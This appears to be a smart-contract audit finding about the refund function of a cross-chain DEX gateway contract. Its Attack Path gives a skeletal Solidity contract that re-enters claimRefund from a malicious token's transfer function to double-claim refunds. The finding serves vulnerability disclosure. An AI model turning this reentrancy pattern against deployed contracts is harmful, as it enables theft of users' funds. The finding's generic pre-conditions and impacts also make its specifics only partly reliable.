# Multiple Security Issues in Refund Mechanism

### Summary

The refund mechanism has multiple vulnerabilities including malicious token handling, reentrancy, and permanent fund loss through state deletion.


### Root Cause

https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L570C1-L590C6



### Internal Pre-conditions

- Valid refundInfo exists
- Token address is set
- Amount is non-zero
- Caller has permission

### External Pre-conditions

- Token contract is active
- No blacklisting
- Sufficient gas
- Valid receiver address

### Attack Path

```solidity
contract MaliciousToken {
    GatewayCrossChain target;
    bytes32 externalId;
    
    function attack() external {
        // Step 1: Setup refund with malicious token
        setupMaliciousRefund();
        
        // Step 2: Trigger claim
        target.claimRefund(externalId);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        // Step 3: Reenter during transfer
        if (canReenter) {
            target.claimRefund(externalId);
        }
        return true;
    }
}
```

### Impact

1. Double claiming of refunds
2. Permanent loss of refunds
3. DOS through failed transfers
4. Fund lockup
5. Trust loss
